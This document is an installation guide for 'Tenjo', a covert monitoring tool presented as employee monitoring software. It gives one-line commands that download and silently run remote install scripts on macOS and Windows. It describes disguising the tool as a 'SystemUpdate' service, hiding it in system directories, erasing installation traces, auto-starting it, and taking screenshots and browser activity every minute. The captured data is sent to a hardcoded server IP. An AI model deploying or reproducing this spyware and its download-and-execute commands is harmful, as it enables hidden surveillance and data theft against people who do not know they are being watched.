# Tenjo Stealth Installation Commands

## One-Line Remote Installation (Stealth Mode)

### macOS - Silent Installation (Recommended)
```bash
curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/quick_install_stealth_macos.sh | bash -s true
```

### macOS - Alternative Method (if above fails)
```bash
curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/install_stealth_macos.sh | bash -s true cleanup
```

### Windows - Silent Installation
```cmd
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/install_stealth_windows.bat' -OutFile '%TEMP%\install_stealth.bat'; cmd /c '%TEMP%\install_stealth.bat' true cleanup; del '%TEMP%\install_stealth.bat'"
```

## Manual Installation (if needed)

### macOS
1. Download repository
2. Navigate to client directory
3. Run: `bash install_stealth_macos.sh true cleanup`

### Windows
1. Download repository
2. Navigate to client directory
3. Run: `install_stealth_windows.bat true cleanup`

## Uninstallation Commands

### macOS (Quick Install Method)
```bash
bash ~/.system_update/uninstall.sh
```

### macOS (Alternative Method)
```bash
bash ~/.system_update/uninstall_stealth_macos.sh true
```

### Windows
```cmd
"%APPDATA%\SystemUpdate\uninstall_stealth_windows.bat" true
```

## Features

### ✅ Completely Silent Operation
- No user prompts or visible windows
- Runs hidden in background
- Auto-starts on boot/login
- No taskbar or system tray icons

### ✅ Stealth Installation
- Downloads and installs automatically
- Hides in system directories
- Removes installation traces
- Uses system service names

### ✅ Auto-Start Configuration
- **macOS**: LaunchAgent/LaunchDaemon
- **Windows**: Task Scheduler
- Starts automatically when computer boots
- Survives user logout/login

### ✅ Monitoring Capabilities
- 📸 Screenshots every 60 seconds
- 🌐 Browser activity tracking
- 💻 Process monitoring
- 📊 System statistics
- 📡 Data transmission to server

### ✅ Professional Disguise
- Service name: "SystemUpdate"
- Appears as legitimate system service
- Hidden from casual inspection
- Low resource usage

## Installation Locations

### macOS
- **User**: `~/.system_update/`
- **System**: `/Library/Application Support/SystemUpdate/`
- **Service**: `~/Library/LaunchAgents/com.system.update.agent.plist`

### Windows  
- **User**: `%APPDATA%\SystemUpdate\`
- **System**: `%PROGRAMDATA%\SystemUpdate\`
- **Service**: Task Scheduler `SystemUpdateService`

## Security Notes

⚠️ **This is monitoring software intended for legitimate employee monitoring purposes only**

- Only use on systems you own or have explicit permission to monitor
- Ensure compliance with local privacy laws
- Inform users of monitoring where legally required
- Use responsibly and ethically

## Technical Details

### Process Names
- **Main Process**: `stealth_main.py` / `python stealth_main.py`
- **Service Name**: `SystemUpdateService` / `com.system.update.agent`
- **Directory Name**: `SystemUpdate` / `.system_update`

### Network Communication
- Connects to: `http://103.129.149.67`
- Encrypted data transmission
- Automatic retry on connection failure
- Minimal bandwidth usage

### Logging
- Silent mode: Warnings and errors only
- Log location: `logs/stealth.log`
- Automatic log rotation
- No console output in stealth mode
